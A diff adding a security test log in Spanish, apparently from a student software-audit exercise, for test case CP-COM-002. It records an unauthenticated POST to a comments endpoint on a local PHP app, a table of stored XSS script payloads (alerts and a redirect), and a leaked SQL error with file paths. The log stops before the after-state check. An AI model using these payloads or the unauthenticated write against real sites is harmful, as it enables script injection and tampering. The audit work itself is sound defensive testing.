@@ -1,0 +1,30 @@
+=== CP-COM-002: acceso sin autenticacion a grcomentarios.php ===
+--- Estado previo en BD (ultimos comentarios) ---
+Id	usuario	comentario	id_restaurante
+7	Administrador	<script>alert("XSS-CP-COM-001")</script>	1
+6	Administrador	<script>window.location.href = "https://www.biobiochile.cl";</script>	2
+5	Administrador	<script>alert("No deberías estar acá, ahora eres responsable de lo que visitarás.");</script>	2
+
+--- Request SIN cookie de sesion ---
+POST /grcomentarios.php  usuario=hacker&comentario=Comentario sin autenticacion
+HTTP/1.1 200 OK
+Host: localhost:8000
+Date: Thu, 02 Jul 2026 00:49:16 GMT
+Connection: close
+X-Powered-By: PHP/8.5.8
+Set-Cookie: PHPSESSID=fd181e7e89903ff47a52dc82ec72db23; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-type: text/html; charset=UTF-8
+
+<br />
+<b>Warning</b>:  Undefined array key "id" in <b>/home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/grcomentarios.php</b> on line <b>6</b><br />
+<br />
+<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1 in /home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/grcomentarios.php:7
+Stack trace:
+#0 /home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/grcomentarios.php(7): mysqli_query()
+#1 {main}
+  thrown in <b>/home/king/Documentos/INACAP/Auditoria-software/Sistema-Para-Pruebas-Aseguramiento/grcomentarios.php</b> on line <b>7</b><br />
+
+--- Estado posterior en BD: se busca el registro insertado por 'hacker' ---
